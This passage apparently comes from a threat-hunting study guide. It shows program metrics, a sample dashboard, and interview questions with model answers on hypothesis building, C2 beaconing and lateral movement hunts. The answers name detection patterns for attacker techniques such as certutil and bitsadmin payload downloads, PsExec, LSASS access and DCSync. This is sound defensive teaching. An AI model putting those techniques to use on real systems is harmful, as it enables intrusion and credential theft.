┌─────────────────────┬─────────────────────────────────────────────────────┐
│ Metric              │ Description                                         │
├─────────────────────┼─────────────────────────────────────────────────────┤
│ Tactic Coverage     │ % of ATT&CK tactics hunted in last quarter          │
│ Target: 100%        │ Track: Initial Access through Exfiltration          │
├─────────────────────┼─────────────────────────────────────────────────────┤
│ Technique Coverage  │ % of top 50 techniques hunted annually              │
│ Target: 80%         │ Based on MITRE top techniques report                │
├─────────────────────┼─────────────────────────────────────────────────────┤
│ Data Source Gaps    │ # of data sources needed but not available          │
│ Target: <5          │ Track visibility improvements                       │
├─────────────────────┼─────────────────────────────────────────────────────┤
│ Asset Coverage      │ % of critical assets with hunt activity             │
│ Target: 100%        │ Crown jewels, DCs, tier-0 systems                   │
└─────────────────────┴─────────────────────────────────────────────────────┘

COVERAGE HEATMAP:
                    Covered    Partial    Not Covered
Initial Access      ████████   ████       ████
Execution           ████████   ████████   ██
Persistence         ████████   ████████   ████
Priv Escalation     ████████   ████       ████████
Defense Evasion     ████████   ████████   ████████
Credential Access   ████████   ████████   ██
Discovery           ████       ████████   ████████
Lateral Movement    ████████   ████████   ████
Collection          ████       ████████   ████████
Exfiltration        ████████   ████       ████████
Impact              ████       ████       ████████████
```

### Effectiveness Metrics

```
HUNT EFFECTIVENESS:
┌─────────────────────┬─────────────────────────────────────────────────────┐
│ Metric              │ Description                                         │
├─────────────────────┼─────────────────────────────────────────────────────┤
│ True Positive Rate  │ (True Positives / Total Findings) × 100             │
│ Target: >50%        │ Indicates hypothesis quality                        │
├─────────────────────┼─────────────────────────────────────────────────────┤
│ Detections Created  │ # of new detection rules from hunt findings         │
│ Target: 2+/hunt     │ Converts hunts to automated coverage                │
├─────────────────────┼─────────────────────────────────────────────────────┤
│ Incidents Discovered│ # of incidents found through hunting                │
│ Benchmark: Track    │ Demonstrates proactive value                        │
├─────────────────────┼─────────────────────────────────────────────────────┤
│ MTTD Improvement    │ Days saved in detection vs. waiting for alert       │
│ Target: Track       │ Shows proactive detection value                     │
├─────────────────────┼─────────────────────────────────────────────────────┤
│ Hypothesis Success  │ % of hypotheses that yielded actionable findings    │
│ Target: >40%        │ Indicates hypothesis development maturity           │
└─────────────────────┴─────────────────────────────────────────────────────┘
```

### Operational Metrics

```
OPERATIONAL EFFICIENCY:
┌─────────────────────┬─────────────────────────────────────────────────────┐
│ Metric              │ Target                                              │
├─────────────────────┼─────────────────────────────────────────────────────┤
│ Hunts per Month     │ 4+ hunts (1 per week minimum)                       │
├─────────────────────┼─────────────────────────────────────────────────────┤
│ Hours per Hunt      │ 8-20 hours (depending on complexity)                │
├─────────────────────┼─────────────────────────────────────────────────────┤
│ Hypothesis Backlog  │ Maintain 20+ hypotheses ready for execution         │
├─────────────────────┼─────────────────────────────────────────────────────┤
│ Hunt Automation     │ 30% of hunts have automated components              │
├─────────────────────┼─────────────────────────────────────────────────────┤
│ Documentation Rate  │ 100% of hunts fully documented                      │
├─────────────────────┼─────────────────────────────────────────────────────┤
│ Intel Integration   │ 80% of relevant intel results in hunt hypothesis    │
└─────────────────────┴─────────────────────────────────────────────────────┘

MONTHLY SCORECARD EXAMPLE:
┌─────────────────────────────────────────────────────────────────────────┐
│ Month: February 2026                                                    │
├─────────────────────┬────────────┬────────────┬────────────────────────┤
│ Metric              │ Target     │ Actual     │ Status                 │
├─────────────────────┼────────────┼────────────┼────────────────────────┤
│ Hunts Completed     │ 4          │ 5          │ ✓ Exceeded             │
│ True Positives      │ 2          │ 3          │ ✓ Exceeded             │
│ Detections Created  │ 8          │ 12         │ ✓ Exceeded             │
│ ATT&CK Techniques   │ 10         │ 8          │ ✗ Below Target         │
│ Hunt Hours          │ 60         │ 72         │ On Track               │
│ Documentation       │ 100%       │ 100%       │ ✓ Met                  │
└─────────────────────┴────────────┴────────────┴────────────────────────┘
```

### Reporting Dashboard

```
EXECUTIVE DASHBOARD:
┌─────────────────────────────────────────────────────────────────────────┐
│ THREAT HUNTING PROGRAM - Q1 2026                                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│ PROACTIVE DETECTION VALUE                                               │
│ ├── Incidents Discovered: 7 (vs 12 from alerts)                        │
│ ├── Average Days Saved: 14 days earlier detection                       │
│ ├── Estimated Cost Avoidance: $2.3M                                    │
│ └── Coverage Improvement: +15% ATT&CK techniques                       │
│                                                                         │
│ HUNT ACTIVITY                                                           │
│ ├── Hunts Completed: 18                                                │
│ ├── Hypotheses Tested: 22                                              │
│ ├── True Positives: 11 (50% success rate)                              │
│ └── Detections Created: 34                                             │
│                                                                         │
│ TOP FINDINGS THIS QUARTER                                               │
│ 1. [Finding 1 - Impact description]                                     │
│ 2. [Finding 2 - Impact description]                                     │
│ 3. [Finding 3 - Impact description]                                     │
│                                                                         │
│ FOCUS AREAS NEXT QUARTER                                                │
│ 1. [Priority area based on gaps]                                        │
│ 2. [Priority area based on intel]                                       │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Interview Questions - Threat Hunting

### Fundamental Questions

```
1. WHAT IS THE DIFFERENCE BETWEEN THREAT HUNTING AND DETECTION?

Strong Answer:
"Detection is reactive - waiting for alerts from signatures or rules that
match known patterns. Threat hunting is proactive - assuming the environment
is already compromised and actively searching for threats that evade existing
detections.

Detection answers 'Did this known bad thing happen?' while hunting answers
'What malicious activity might be occurring that we don't have rules for?'

The key distinction is that hunting is hypothesis-driven and human-led,
while detection is automated and rule-based. Good hunting programs create
new detections from their findings, so hunting feeds back into detection."

2. HOW DO YOU DEVELOP HUNTING HYPOTHESES?

Strong Answer:
"I develop hypotheses from multiple sources:

1. Threat Intelligence: When I see reports about APTs targeting our sector,
   I extract the TTPs and hunt for those specific behaviors.

2. ATT&CK Gap Analysis: I map our detection coverage to ATT&CK and identify
   techniques we can't detect. Those become hunt hypotheses.

3. Incident Learnings: After incidents, I ask 'what did we miss?' and hunt
   for similar patterns we might have overlooked.

4. Crown Jewel Analysis: I think like an attacker - if I wanted to access
   our most valuable assets, what would I need to do? Then I hunt for those
   activities.

5. Red Team/Pentest Findings: Techniques that bypassed our controls in
   assessments become high-priority hypotheses.

A good hypothesis is specific, testable, and mapped to data sources. For
example: 'APT29 is known to use WMI for persistence on domain controllers.
I'll search Sysmon Event 1 for WmiPrvSE spawning unusual child processes
on our DCs.'"

3. DESCRIBE YOUR HUNTING METHODOLOGY.

Strong Answer:
"I follow a structured approach:

1. Hypothesis Development: Start with a specific, testable assumption based
   on intel, ATT&CK gaps, or situational awareness.

2. Data Source Identification: Determine what logs and telemetry would show
   evidence of the hypothesized activity.

3. Query Development: Build queries to find the activity. I start broad to
   understand the baseline, then narrow based on anomalies.

4. Analysis: Review results, filter false positives, investigate suspicious
   findings. I use stacking and statistical analysis to find outliers.

5. Investigation: Deep-dive on true positives. Pivot to related activity,
   build timeline, assess scope.

6. Documentation: Record methodology, queries, findings, and false positive
   patterns for future reference.

7. Detection Creation: Convert findings into automated detections so we
   catch this activity in the future.

8. Iteration: Refine hypothesis based on findings, or move to next hypothesis."
```

### Technical Questions

```
4. WALK ME THROUGH A SUCCESSFUL HUNT YOU'VE CONDUCTED.

Strong Answer Structure (STAR Method):
"Situation: After reading a report about Volt Typhoon targeting our sector
using living-off-the-land techniques, I initiated a hunt for LOLBin abuse.

Task: Hypothesis was that attackers might be using certutil or bitsadmin
for downloading payloads, which could bypass endpoint detection.

Action: I queried Sysmon Event 1 for certutil with -urlcache or bitsadmin
with /transfer, filtering out known IT automation. Found 3 instances of
certutil downloading files to user AppData directories - unusual because
our IT doesn't use certutil for deployments.

Result: Investigation revealed a compromised workstation where an attacker
used certutil to download a Cobalt Strike beacon. We contained the system,
found 2 more compromised hosts through lateral movement tracking, and
eradicated the threat. I created a detection rule that's since caught
3 similar attempts at the download stage."

5. HOW DO YOU DETECT C2 BEACONING?

Strong Answer:
"I use multiple approaches:

1. Timing Analysis: Calculate standard deviation of connection intervals.
   Regular beaconing has low variance. I bucket connections by time window
   and look for consistent patterns.

2. Jitter Detection: Modern C2 uses jitter to avoid detection. I look for
   connections within a consistent range (e.g., 55-65 seconds) rather than
   exact intervals.

3. Byte Analysis: Beacons often have consistent request/response sizes.
   I look for low variance in payload sizes to the same destination.

4. Domain Analysis: Check domain age, registration date, Alexa rank. C2
   often uses newly registered domains or those with low reputation.

5. User Agent Analysis: Look for anomalous or generic user agents,
   especially repeated use of the same unusual UA string.

6. DNS Indicators: High volume of DNS queries to same domain, unusual
   query types (TXT for tunneling), high subdomain entropy (DGA).

Query example: Calculate coefficient of variation for connection intervals.
If CV < 0.3 over 24+ hours, flag for review."

6. EXPLAIN HOW YOU'D HUNT FOR LATERAL MOVEMENT.

Strong Answer:
"I approach lateral movement hunting by technique:

1. WMI: Query for wmic.exe with /node parameter or PowerShell with
   Invoke-WmiMethod and remote computer names. On targets, look for
   WmiPrvSE spawning unusual child processes.

2. PsExec/SMB: Look for service installation (7045) with PSEXESVC or
   similar names. Monitor admin share access (5140) to C$, ADMIN$.
   Named pipe connections to known PsExec pipes.

3. RDP: Track 4624 LogonType 10 from unexpected sources. Build baseline
   of normal RDP sources and alert on deviations. Watch for RDP chaining.

4. WinRM: Look for winrshost.exe spawning processes, especially from
   non-administrative sources.

5. DCOM: Monitor for unusual DCOM activation, especially MMC20.Application
   or ShellBrowserWindow.

I also hunt for lateral movement indicators:
- Explicit credential use (4648) between workstations
- Unusual authentication patterns (workstation to workstation)
- Admin tools on non-admin systems
- Rapid authentication across multiple systems (chain detection)"

7. HOW DO YOU HANDLE FALSE POSITIVES IN HUNTING?

Strong Answer:
"False positives are valuable data in hunting. My approach:

1. Document Everything: I record why something appeared suspicious and
   why it was deemed legitimate. This builds institutional knowledge.

2. Whitelist Development: Create tuned whitelists for legitimate activity.
   But I'm cautious - attackers can hide in legitimate patterns.

3. Context Enrichment: Add context to queries - is this a known admin?
   Is this during change windows? Is this an IT automation account?

4. Statistical Approaches: Use stacking to find true outliers. If 95%
   of results are the same legitimate pattern, focus on the 5%.

5. Feedback Loop: If a hunt has >80% false positives, the hypothesis
   needs refinement. Too broad a query isn't useful.

6. Living Whitelists: I create lookup tables that can be updated without
   modifying queries. Makes maintenance easier.

The goal is to reduce false positives to a manageable level while not
filtering out true positives. I'd rather review 10 extra false positives
than miss one real threat."
```

### Scenario Questions

```
8. NEW RANSOMWARE IS TARGETING YOUR INDUSTRY. HOW DO YOU HUNT FOR IT?

Strong Answer:
"I'd take a multi-phase approach:

Phase 1 - Intel Extraction (Day 1):
- Extract all IOCs from threat reports (hashes, IPs, domains)
- Identify TTPs and map to ATT&CK
- Understand the kill chain specific to this ransomware

Phase 2 - IOC Hunt (Day 1):
- Search for known IOCs across all data sources
- Hash lookups in EDR, DNS queries for C2 domains
- Network connections to known infrastructure

Phase 3 - TTP Hunt (Day 1-3):
Based on the typical ransomware TTPs:
- Initial Access: Hunt for phishing payloads, malicious macros
- Execution: Look for associated loader patterns, PowerShell cradles
- Persistence: Hunt for new services, scheduled tasks
- Credential Access: LSASS access, DCSync attempts
- Discovery: AD enumeration tools (BloodHound, ADFind)
- Lateral Movement: WMI, PsExec, RDP patterns
- Defense Evasion: EDR tampering, security tool termination
- Impact: Volume shadow copy deletion, backup disruption

Phase 4 - Pre-Encryption Indicators:
- Mass file access patterns
- Staging in temp directories
- Network shares enumeration
- Backup system access

I'd prioritize based on our specific exposure and update detections
as I learn more about the threat."

9. YOUR CEO'S ACCOUNT SHOWS SUSPICIOUS LOGIN. HOW DO YOU HUNT?

Strong Answer:
"This is a high-priority situation requiring careful hunting:

Immediate Actions:
1. Verify the alert isn't a false positive (IT testing, travel, etc.)
2. If suspicious, consider containment while hunting
3. Pull 90-day authentication history for baseline

Hunt for Account Compromise:
- Analyze all authentication events: times, sources, locations
- Look for impossible travel (logins from distant locations)
- Check for auth from new devices or user agents
- Review MFA challenges and any bypasses
- Look for password reset or MFA enrollment changes

Hunt for Lateral Impact:
- What did the account access after suspicious login?
- Any email forwarding rules created?
- Any OAuth app consents granted?
- File access in SharePoint/OneDrive?
- Any mailbox searches or exports?

Hunt for Broader Compromise:
- Did other executives show similar patterns?
- Any phishing emails sent TO the CEO before this?
- Are there signs of BEC (business email compromise)?
- Check for inbox rules hiding attacker communication

Hunt for Persistence:
- New devices registered to the account?
- App passwords created?
- Service principal credentials?

Documentation throughout for potential legal/HR involvement."

10. HOW WOULD YOU BUILD A THREAT HUNTING PROGRAM FROM SCRATCH?

Strong Answer:
"I'd approach this in phases:

Phase 1 - Foundation (Month 1-2):
- Assess current data sources and visibility
- Identify gaps in logging and telemetry
- Establish baseline understanding of the environment
- Define scope: what assets, what threats

Phase 2 - Process Development (Month 2-3):
- Create hypothesis development framework
- Build documentation templates
- Establish metrics and KPIs
- Define hunting cadence (weekly hunts)
- Create hypothesis backlog

Phase 3 - Initial Hunts (Month 3-6):
- Start with high-value, well-documented techniques
- Focus on ATT&CK techniques relevant to our threat model
- Use proven hypotheses from industry
- Build query library and playbooks
- Document everything - including what doesn't work

Phase 4 - Maturation (Month 6-12):
- Develop custom hypotheses based on environment knowledge
- Implement hunt automation for repeatable queries
- Integrate threat intel into hypothesis generation
- Create feedback loop with detection engineering
- Measure and report on program value

Phase 5 - Advanced (Year 2+):
- Statistical and ML-assisted hunting
- Proactive threat research
- Contribute back to community
- Hunt-driven security strategy

Key success factors:
- Executive support for dedicated hunting time
- Quality data sources
- Skilled analysts
- Integration with IR and detection engineering"
```

### Leadership/Process Questions

```
11. HOW DO YOU PRIORITIZE WHAT TO HUNT FOR?

Strong Answer:
"I use a risk-based prioritization framework:

Tier 1 - Hunt Immediately:
- Active threat intel about attacks on our sector
- Techniques used in recent incidents (internal or reported)
- Coverage gaps for techniques targeting crown jewels
- Red team findings that bypassed detection

Tier 2 - Hunt Monthly:
- Top ATT&CK techniques by prevalence
- Techniques we have partial visibility into
- Emerging techniques from research

Tier 3 - Hunt Quarterly:
- Comprehensive ATT&CK coverage rotation
- Less common techniques
- Hypothesis backlog maintenance

Factors I consider:
- Threat likelihood (is this targeting our sector?)
- Impact (what's at risk if this succeeds?)
- Detection gap (do we have any visibility?)
- Data availability (can we actually hunt for this?)
- Hunt complexity (resource investment)

I maintain a prioritized backlog of 20+ hypotheses and review priority
weekly based on new intelligence or incidents."

12. HOW DO YOU MEASURE HUNTING PROGRAM SUCCESS?

Strong Answer:
"I measure across several dimensions:

Detection Value:
- Number of detections created from hunt findings
- ATT&CK coverage improvement over time
- Reduction in detection gaps

Proactive Discovery:
- Incidents discovered through hunting (vs. alerts)
- Average time saved compared to passive detection
- True positive rate of hunt findings

Operational Efficiency:
- Hunts completed per month
- Time per hunt
- Hypothesis success rate

Business Impact:
- Estimated cost avoidance from early detection
- Risk reduction quantification
- Compliance/audit improvements

I report these metrics monthly to leadership, with quarterly deep-dives
on program effectiveness. The most compelling metric is usually 'we
found X threat Y days before our automated detection would have' -
that's the core value proposition of hunting."

13. HOW DO YOU STAY CURRENT WITH NEW TECHNIQUES?

Strong Answer:
"I maintain multiple information sources:

Daily:
- Twitter/X security researchers (specific list)
- Threat intel feeds (internal TIP)
- Security news aggregators

Weekly:
- New ATT&CK technique updates
- Vendor threat reports
- CISA advisories
- Industry ISAC bulletins

Monthly:
- In-depth threat reports (Mandiant, CrowdStrike)
- Security conference talks
- Academic papers on new techniques

Continuous:
- Lab environment for testing new techniques
- Collaboration with red team
- Peer discussion and knowledge sharing

When I learn about a new technique, I immediately assess:
1. Is this relevant to our environment?
2. Would our current detections catch it?
3. Should this become a hunt hypothesis?

This systematic approach ensures new techniques get evaluated and
incorporated into our hunting program quickly."
```

---

**Next: [08_MALWARE_RANSOMWARE.md](./08_MALWARE_RANSOMWARE.md) →**
